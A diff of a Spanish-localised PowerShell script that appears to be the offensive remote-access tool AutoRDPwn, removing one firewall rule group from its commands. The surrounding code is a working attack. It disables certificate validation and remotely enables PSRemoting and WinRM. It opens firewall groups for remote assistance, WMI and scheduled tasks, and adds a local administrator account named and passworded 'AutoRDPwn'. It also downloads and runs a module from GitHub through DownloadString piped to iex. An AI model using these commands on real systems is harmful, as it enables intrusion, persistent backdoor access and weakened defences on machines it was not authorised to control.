@@ -58,7 +58,7 @@ function EnableTLS {
     [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }
 
 $Ps1="Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
-$Ps2="netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes"
+$Ps2="netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes"
 $Ps3="netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
 $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes"
 $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
@@ -133,11 +133,11 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
         (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
         if($pssession -like 's') { $PSSession = New-PSSession -Computer $computer -credential $credential
         Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" }
-        Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" } 
+        Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" } 
         Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes" }
         Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes" }} else {
 	Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" }
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" }
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes" }
         Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes" }}}
 
